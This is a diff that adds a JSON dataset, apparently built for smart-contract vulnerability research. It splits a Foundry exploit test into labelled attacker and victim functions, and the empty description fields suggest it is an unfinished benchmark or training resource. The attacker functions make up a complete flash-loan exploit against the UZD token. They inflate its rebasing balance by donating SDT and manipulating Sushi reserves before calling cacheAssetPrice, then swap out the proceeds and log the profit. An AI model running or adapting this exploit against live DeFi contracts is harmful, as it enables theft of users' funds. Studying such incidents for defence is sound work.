@@ -1,0 +1,212 @@
+[
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "receiveFlashLoan",
+    "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        apporveAll();\n\n        uint256[2] memory amount;\n        amount[0] = 0;\n        amount[1] = 5_750_000 * 1e6;\n        uint256 crvFRAXBalance = FRAX_USDC_POOL.add_liquidity(amount, 0); // mint crvFRAX\n\n        UZD_crvFRAX_POOL.exchange(1, 0, crvFRAXBalance, 0, address(this)); // swap crvFRAX to UZD\n\n        crvUSD_USDC_POOL.exchange(0, 1, 1_250_000 * 1e6, 0, address(this)); // swap USDC to crvUSD\n\n        crvUSD_UZD_POOL.exchange(1, 0, crvUSD.balanceOf(address(this)), 0, address(this)); // swap crvUSD to UZD\n\n        ETH_SDT_POOL.exchange(0, 1, 11 ether, 0, false, address(this)); // swap WETH to SDT\n\n        // @Vulnerability Code:\n        // UZD balanceOf return value is manipulated by the following values\n        // uint256 amountIn = sdtEarned + _config.sdt.balanceOf(address(this)); -> get SDT amount in MIMCurveStakeDao\n        // uint256 sdtEarningsInFeeToken = priceTokenByExchange(amountIn, _config.sdtToFeeTokenPath); -> sushi router.getAmountsOut(amountIn, exchangePath); path: SDT -> WETH -> USDT\n        emit log_named_decimal_uint(\n            \"Before donation and reserve manipulation, UZD balance\", UZD.balanceOf(address(this)), WETH.decimals()\n        );\n        SDT.transfer(MIMCurveStakeDao, SDT.balanceOf(address(this))); // donate SDT to MIMCurveStakeDao, inflate UZD balance\n\n        swapToken1Totoken2(WETH, SDT, 10_000 ether); // swap WETH to SDT by sushi router\n        uint256 value = swapToken1Totoken2(USDT, WETH, 7_000_000 * 1e6); // swap USDT to WETH by sushi router\n\n        UZD.cacheAssetPrice(); // rebase UZD balance\n\n        emit log_named_decimal_uint(\n            \"After donation and reserve manipulation, UZD balance\", UZD.balanceOf(address(this)), WETH.decimals()\n        );\n\n        swapToken1Totoken2(SDT, WETH, SDT.balanceOf(address(this))); // swap SDT to WETH\n        swapToken1Totoken2(WETH, USDT, value); // swap WETH to USDT\n\n        UZD_crvFRAX_POOL.exchange(0, 1, UZD.balanceOf(address(this)) * 84 / 100, 0, address(this)); // swap UZD to crvFRAX\n\n        crvUSD_UZD_POOL.exchange(0, 1, UZD.balanceOf(address(this)), 0, address(this)); // swap UZD to crvUSD\n\n        FRAX_USDC_POOL.remove_liquidity(crvFRAX.balanceOf(address(this)), [uint256(0), uint256(0)]); // burn crvFRAX\n\n        FRAX_USDC_POOL.exchange(0, 1, FRAX.balanceOf(address(this)), 0); // swap FRAX to USDC\n\n        crvUSD_USDC_POOL.exchange(1, 0, crvUSD.balanceOf(address(this)), 0, address(this)); // swap crvUSD to USDC\n\n        Curve3POOL.exchange(1, 2, 25_920 * 1e6, 0); // swap USDC to USDT\n\n        uint256 swapAmount = USDC.balanceOf(address(this)) - amounts[0];\n        USDC_WETH_Pair.swap(address(this), true, int256(swapAmount), 920_316_691_481_336_325_637_286_800_581_326, \"\"); // swap USDC to WETH\n\n        IERC20(tokens[0]).transfer(msg.sender, amounts[0] + feeAmounts[0]);\n        IERC20(tokens[1]).transfer(msg.sender, amounts[1] + feeAmounts[1]);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 17_908_949);\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(UZD), \"UZD\");\n        vm.label(address(crvUSD), \"crvUSD\");\n        vm.label(address(crvFRAX), \"crvFRAX\");\n        vm.label(address(USDT), \"USDT\");\n        vm.label(address(FRAX), \"FRAX\");\n        vm.label(address(FRAX_USDC_POOL), \"FRAX_USDC_POOL\");\n        vm.label(address(UZD_crvFRAX_POOL), \"UZD_crvFRAX_POOL\");\n        vm.label(address(crvUSD_USDC_POOL), \"crvUSD_USDC_POOL\");\n        vm.label(address(crvUSD_UZD_POOL), \"crvUSD_UZD_POOL\");\n        vm.label(address(Curve3POOL), \"Curve3POOL\");\n        vm.label(address(ETH_SDT_POOL), \"ETH_SDT_POOL\");\n        vm.label(address(sushiRouter), \"sushiRouter\");\n        vm.label(address(USDC_WETH_Pair), \"USDC_WETH_Pair\");\n        vm.label(address(USDC_USDT_Pair), \"USDC_USDT_Pair\");\n        vm.label(address(Balancer), \"Balancer\");\n        vm.label(address(MIMCurveStakeDao), \"MIMCurveStakeDao\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() external {\n        USDC_USDT_Pair.flash(address(this), 0, 7_000_000 * 1e6, abi.encode(7_000_000 * 1e6));\n\n        emit log_named_decimal_uint(\n            \"Attacker WETH balance after exploit\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), USDT.decimals()\n        );\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "uniswapV3FlashCallback",
+    "original_code": "    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {\n        BalancerFlashLoan();\n\n        uint256 amount = abi.decode(data, (uint256));\n        TransferHelper.safeTransfer(address(USDT), address(USDC_USDT_Pair), amount1 + amount);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "uniswapV3SwapCallback",
+    "original_code": "    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {\n        USDC.transfer(msg.sender, uint256(amount0Delta));\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUZD",
+    "source_type": "victim_contract",
+    "function_name": "allowance",
+    "original_code": "    function allowance(address owner, address spender)\n        public\n        view\n        virtual\n        override\n        returns (uint256)\n    {\n        if (!containRigidAddress(owner)) return super.allowance(owner, spender);\n\n        return _allowancesRigid[owner][spender];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUZD",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n\n        if (!containRigidAddress(owner)) return super.approve(spender, amount);\n\n        _approveRigid(owner, spender, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUZD",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        if (!containRigidAddress(account)) return super.balanceOf(account);\n\n        return _balancesRigid[account];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUZD",
+    "source_type": "victim_contract",
+    "function_name": "cacheAssetPrice",
+    "original_code": "    function cacheAssetPrice() public virtual {\n        _blockCached = block.number;\n        uint256 currentAssetPrice = assetPrice();\n        if (_assetPriceCached < currentAssetPrice) {\n            _assetPriceCached = currentAssetPrice;\n            emit CachedAssetPrice(_blockCached, _assetPriceCached);\n        }\n    }\n\n    function _cacheAssetPriceByBlock() internal virtual {\n        if (block.number >= _blockCached + assetPriceCacheDuration()) {\n            cacheAssetPrice();\n        }\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUZD",
+    "source_type": "victim_contract",
+    "function_name": "decimals",
+    "original_code": "    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUZD",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "    function deposit(uint256[3] memory amounts) external returns (uint256) {\n        if (!checkDepositSuccessful(amounts)) {\n            return 0;\n        }\n\n        uint256 poolLPs = depositPool(amounts);\n\n        return (poolLPs * getCurvePoolPrice()) / CURVE_PRICE_DENOMINATOR;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUZD",
+    "source_type": "victim_contract",
+    "function_name": "name",
+    "original_code": "    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUZD",
+    "source_type": "victim_contract",
+    "function_name": "owner",
+    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUZD",
+    "source_type": "victim_contract",
+    "function_name": "symbol",
+    "original_code": "    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUZD",
+    "source_type": "victim_contract",
+    "function_name": "totalSupply",
+    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return super.totalSupply() + _totalSupplyRigid;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUZD",
+    "source_type": "victim_contract",
+    "function_name": "transfer",
+    "original_code": "    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n\n        if (containRigidAddress(owner)) {\n            _transferRigid(owner, to, amount);\n            if (!containRigidAddress(to)) _convertRigidToElasticBalancePartially(to, amount);\n        } else {\n            super.transfer(to, amount);\n            if (containRigidAddress(to)) _convertElasticToRigidBalancePartially(to, amount);\n        }\n\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUZD",
+    "source_type": "victim_contract",
+    "function_name": "transferFrom",
+    "original_code": "    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUZD",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "    function withdraw(\n        address withdrawer,\n        uint256 userRatioOfCrvLps, // multiplied by 1e18\n        uint256[3] memory tokenAmounts,\n        WithdrawalType withdrawalType,\n        uint128 tokenIndex\n    ) external virtual onlyZunami returns (bool) {\n        require(userRatioOfCrvLps > 0 && userRatioOfCrvLps <= 1e18, 'Wrong lp Ratio');\n        (bool success, uint256 removingCrvLps, uint256[] memory tokenAmountsDynamic) = calcCrvLps(\n            withdrawalType,\n            userRatioOfCrvLps,\n            tokenAmounts,\n            tokenIndex\n        );\n\n        if (!success) {\n            return false;\n        }\n\n        uint256[] memory prevBalances = new uint256[](3);\n        for (uint256 i = 0; i < 3; i++) {\n            prevBalances[i] =\n                _config.tokens[i].balanceOf(address(this)) -\n                ((i == feeTokenId) ? managementFees : 0);\n        }\n\n\n        vault.withdraw(removingCrvLps);\n\n        removeCrvLps(removingCrvLps, tokenAmountsDynamic, withdrawalType, tokenAmounts, tokenIndex);\n\n        transferAllTokensOut(withdrawer, prevBalances);\n\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurve",
+    "source_type": "victim_contract",
+    "function_name": "exchange",
+    "original_code": "    function exchange(\n        int128 i,\n        int128 j,\n        uint256 input,\n        uint256 min_output\n    ) external returns (uint256);\n\n    function exchange_underlying(\n        int128 i,\n        int128 j,\n        uint256 input,\n        uint256 min_output\n    ) external;\n\n",
+    "description": ""
+  }
+]
